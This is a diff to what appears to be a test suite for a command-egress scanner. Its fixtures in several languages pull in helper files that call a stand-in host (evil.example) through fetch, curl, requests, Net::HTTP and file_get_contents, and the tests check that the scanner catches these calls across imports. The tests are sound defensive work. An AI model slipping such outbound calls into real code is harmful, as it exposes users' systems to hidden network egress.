@@ -99,6 +99,53 @@ await expectClean(`cd ${dir} && npm run test`, 'npm run test (echo) clean')
 w('test_sample.py', 'import requests\ndef test_x():\n    requests.get("https://evil.example/x")\n')
 await expectHit(`cd ${dir} && pytest`, 'pytest collects test_*.py with smuggled request')
 
+// --- language-branch coverage for extractLocalImports -------------
+// node require: ./x.js
+w('main_node_req.js', "const u = require('./util_evil.js'); console.log(u)\n")
+w('util_evil.js', 'fetch("https://evil.example/node-req")\n')
+await expectHit(`node ${dir}/main_node_req.js`, 'node require transitive hit')
+
+// node esm import: ./x (extension probing)
+w('main_node_imp.js', "import { x } from './util_evil2'; console.log(x)\n")
+w('util_evil2.js', 'fetch("https://evil.example/node-imp")\n')
+await expectHit(`node ${dir}/main_node_imp.js`, 'node esm import transitive hit')
+
+// python `from . import sub`
+w('pkg_main.py', 'from . import sub_evil\nprint("ok")\n')
+w('sub_evil.py', 'import requests\nrequests.get("https://evil.example/py-rel")\n')
+await expectHit(`python3 ${dir}/pkg_main.py`, 'python from . import transitive hit')
+
+// shell `source ./x.sh`
+w('main_shell.sh', 'source ./util_evil.sh\necho ok\n')
+w('util_evil.sh', 'curl https://evil.example/sh-source\n')
+await expectHit(`bash ${dir}/main_shell.sh`, 'shell source transitive hit')
+
+// ruby require ./x
+w('main_ruby.rb', "require './util_evil'\nputs 'ok'\n")
+w('util_evil.rb', 'Net::HTTP.get(URI("https://evil.example/rb"))\n')
+await expectHit(`ruby ${dir}/main_ruby.rb`, 'ruby require transitive hit')
+
+// php require ./x.php
+w('main_php.php', "<?php require './util_evil.php'; ?>\n")
+w('util_evil.php', "<?php file_get_contents('https://evil.example/php'); ?>\n")
+await expectHit(`php ${dir}/main_php.php`, 'php require transitive hit')
+
+// external URL import is skipped (early return in pushCandidates)
+w('main_url.js', "import 'https://cdn.example/lib.js'\nconsole.log('ok')\n")
+const urlR = await scanCommandForEgress(`node ${dir}/main_url.js`)
+ok(urlR.hits.length === 0, 'external URL import skipped (no false hit)')
+
+// node dynamic import('./x')
+w('main_dyn.js', "import('./util_evil3').then((m) => console.log(m))\n")
+w('util_evil3.js', 'fetch("https://evil.example/dyn-imp")\n')
+await expectHit(`node ${dir}/main_dyn.js`, 'node dynamic import transitive hit')
+
+// npx runner: flags + positional parsing path
+await expectClean(`npx --yes tsc --noEmit`, 'npx runner flags parse (package not a local script)')
+
+// -(c|e)= inline-code defensive branch (perl -e=… style)
+await expectClean(`perl -e='print qq(hello)'`, 'perl -e= inline clean (no egress)')
+
 // --- cleanup ------------------------------------------------------
 rmSync(dir, { recursive: true, force: true })
 
